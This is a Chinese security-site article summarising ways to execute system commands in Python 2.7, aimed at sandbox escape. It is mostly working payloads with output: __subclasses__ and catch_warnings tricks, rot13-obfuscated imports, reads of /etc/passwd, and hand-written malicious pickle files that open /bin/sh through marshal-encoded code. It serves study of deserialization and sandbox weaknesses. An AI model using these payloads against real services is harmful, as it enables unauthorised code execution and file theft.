# python 执行系统命令的多种方式

阅读量 **274169**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-21 14:30:15

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01691edf6be471d48a.jpg)

## 0x00 前言

本片文章总结下在python 的环境下的执行系统命令的方式，本文Python版本为2.7，Python3
不是很熟，因为很多好的工具都是基于Python2的，比如Impacket，Empire(flask)，所以我也很少用Python3
写东西。如果对Python3熟练的同学，可以对本文的涉及到的东西进行相应的变换，大家还有什么更多的方式可以留言交流。

## 0x01 python function

  * `exec('import os ;os.system("ls")')`

先说下exec函数，从[文档](https://docs.python.org/2/reference/simple_stmts.html#exec)
可以知道，参数是UTF-8,Latin字符串，打开的File对象，以及代码对象或者Tuple。字符串类型会被解析为Python
代码然后执行，代码对象就是直接执行，File对象根据EOF来解析，然后执行代码，Tuple对象可以去查看文档中所说的情形。

![](https://p3.ssl.qhimg.com/t017f3db6c9cc7b666b.png)

  * `eval('__import__("os").system("ls")')`

Eval函数，从[文档](https://docs.python.org/2/library/functions.html?highlight=eval#eval)中的定义为:`eval(expression[,
globals[, locals]])`
，第一个表达式参数是String类型，globals必须是字典类型，在没有globals和locals参数时，就会执行表达式。如果缺少`__builtin__`
库时，会在执行表达式之前把当前指定的 globals
复制到全局的globals。但是Eval也是可以执行代码对象的。比如`eval(compile('print "hello world"',
'<stdin>', 'exec'))` ，在用到exec作为参数时函数会返回`None` 。

![](https://p5.ssl.qhimg.com/t01bf461274b22f5601.png)

这个[例子](http://www.freebuf.com/articles/web/136180.html)：读取文件，把参数加入到globals对象中。

    
    
        def from_pyfile(self, filename, silent=False):
            filename = os.path.join(self.root_path, filename)
            d = imp.new_module('config')
            d.__file__ = filename
            try:
                with open(filename) as config_file:
                    exec(compile(config_file.read(), filename, 'exec'), d.__dict__)
            except IOError as e:
                if silent and e.errno in (errno.ENOENT, errno.EISDIR):
                    return False
                e.strerror = 'Unable to load configuration file (%s)' % e.strerror
                raise
            self.from_object(d)
            return True
    

  * `system('ls')`
  * `subprocess.Popen('ls')`
  * `os.popen('ls')`

## 0x02 python lib

Python 都是通过引入不同的库，来执行其中的函数。关于Import
的各种方式，可以看看[这里](https://xz.aliyun.com/t/52#toc-9)的总结。我这里直接列出Payload:

    
    
    >>> [].__class__
    <type 'list'>
    >>> [].__class__.__base__
    <type 'object'>
    >>> [].__class__.__base__.__subclasses__
    <built-in method __subclasses__ of type object at 0x55a9f3d5cb80>
    >>> [].__class__.__base__.__subclasses__()
    [<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
    >>> [].__class__.__base__.__subclasses__()[40]
    <type 'file'>
    >>> [].__class__.__base__.__subclasses__()[40]('/etc/hosts','r').read()
    '127.0.0.1tlocalhostn127.0.1.1tdebiannn# The following lines are desirable for IPv6 capable hostsn::1     localhost ip6-localhost ip6-loopbacknff02::1 ip6-allnodesnff02::2 ip6-allroutersn'
    

`[].__class__.__base__.__subclasses__()[40]('/etc/hosts','r').read()`通过调用File函数来读取或者写文件。

`"".__class__.__mro__[-1].__subclasses__()[40]('/etc/hosts').read()`

遍历是否有catch_warnings，在导入linecache时会在导入os模块：

    
    
    >>> g_warnings = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__repr__.im_func.func_globals
    >>> print g_warnings["linecache"].os
    <module 'os' from '/usr/lib/python2.7/os.pyc'>
    >>> print g_warnings["linecache"].os.system('id')
    uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(scanner)
    

`__import__("pbzznaqf".decode('rot_13')).getoutput('id')` 或者 `import
importlib;importlib.import_module("pbzznaqf".decode('rot_13')).getoutput('id')`

对于前面这些所使用的函数都是来自于`__builtin__` ，如果被删除了就使用`reload(__builtin__)`

和`import imp;imp.reload(__builtin__)`

`__builtin__.eval('__import__("os").system("ls")')` 执行命令

在sys.modules中os模块不存在的时候，因为python导入库，其实就是执行一遍代码，所以`if __name__ =='__main__'`
就是为了防止在引入的时候，执行其中的代码。所以我们可以给Sys.module添加一个新module：

    
    
    >>> import sys
    >>> sys.modules['os']='/usr/lib/python2.7/os.py'
    >>> import os
    

execfile() 利用OS文件来执行命令：

    
    
    >>> execfile('/usr/lib/python2.7/os.py')
    >>> system('cat /etc/passwd')
    

getattr函数，要先引入OS模块：

    
    
    import os;getattr(os,'system')('id')
    

## 0x03 其他

利用Pickle.load来执行命令：

    
    
    >>> import pickle;pickle.load(open('cmd'))
    $ id
    uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth),116(scanner)
    $ pwd
    /tmp
    $ cat cmd
    cos
    system
    (S'/bin/sh'
    tR.
    

解释下cmd文件，

第一行c就是读取这一行作为module引入，读取下一行作为module中的object，所以就变成了os.system。

第三行`(` 与第四行`t`组成元组，`S` 读取这一行的字符串，`R`把元组作为参数带入到上一个对象中执行。`.`表示pickle结束。

我们os模块的引用放入到函数中，并且利用marshal来序列化及进行编码。这里的`__code__`也是在上一篇节引用文章有提过的`func_code`

    
    
    import marshal
    import base64
    def foo():
        import os
        os.system('/bin/sh')
    
    print base64.b64encode(marshal.dumps(foo.__code__))
    
    #output
    YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zBwAAAC9iaW4vc2goAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwUAAABzcy5weXQDAAAAZm9vAwAAAHMEAAAAAAEMAQ==
    

![](https://p3.ssl.qhimg.com/t013db136e81e890b64.png)

要执行其中的`foo()`的话，先解码，然后加载函数：

    
    
    code_str = base64.b64decode(code_enc)
    code = marshal.loads(code_str)
    func = types.FunctionType(code, globals(), '')
    func()
    

![](https://p5.ssl.qhimg.com/t01a74ed035567bf52d.png)

其中引入了types，marshal，base64，globals，globals可以通过`__builtin__.globals`
来调用这个函数，所以根据Pickle的格式要求，我们的Pickle的文件内容应该是这样：

    
    
    ctypes
    FunctionType
    (cmarshal
    loads
    (cbase64
    b64decode
    (S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zBwAAAC9iaW4vc2goAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwUAAABzcy5weXQDAAAAZm9vAwAAAHMEAAAAAAEMAQ=='
    tR #base64 结束
    tR #marshal 结束
    c__builtin__
    globals
    (tR #globals 结束
    S'' 
    tR # '' 空字符
    (tR. #调用函数
    

![](https://p4.ssl.qhimg.com/t010db90e175945a3d2.png)

所有这些执行命令的方式基本都是靠引用其他库，间接引用OS库，来执行命令或者读文件之类的。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **anw2** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/156916](/post/id/156916)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Python](/tag/Python)
  * [代码安全](/tag/代码安全)

 **+1** __6赞

 __收藏

![](https://p2.ssl.qhimg.com/t010857340ce46bb672.jpg) anw2

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

